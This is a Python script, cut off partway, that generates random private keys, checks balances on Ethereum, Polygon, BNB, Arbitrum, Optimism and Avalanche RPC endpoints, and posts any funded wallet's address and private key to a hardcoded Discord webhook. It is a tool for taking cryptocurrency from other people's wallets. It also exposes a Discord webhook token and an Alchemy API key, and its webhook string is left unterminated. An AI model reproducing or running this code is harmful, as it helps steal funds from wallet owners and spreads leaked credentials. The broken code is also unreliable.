import secrets
import requests
import hashlib
from ecdsa import SigningKey, SECP256k1
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Discord Webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a

# Basic ANSI Colors
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

# RPC endpoints
RPC_ENDPOINTS = {
    "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
    "POLYGON": "https://polygon-rpc.com",
    "BNB": "https://bsc-dataseed.binance.org/",
    "ARBITRUM": "https://arb1.arbitrum.io/rpc",
    "OPTIMISM": "https://mainnet.optimism.io",
    "AVAX": "https://api.avax.network/ext/bc/C/rpc"
}

def send_discord_alert(chain, address, private_key, balance):
    data = {
        "content": f"🚨 **{chain} Balance Found!**\n"
                   f"**Address**: `{address}`\n"
                   f"**Private Key**: `0x{private_key}`\n"
                   f"**Balance**: `{balance} {chain}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"[!] Failed to send Discord alert: {e}")

def generate_private_key():
    return secrets.token_hex(32)

def private_key_to_address(private_key_hex):
    private_key_bytes = bytes.fromhex(private
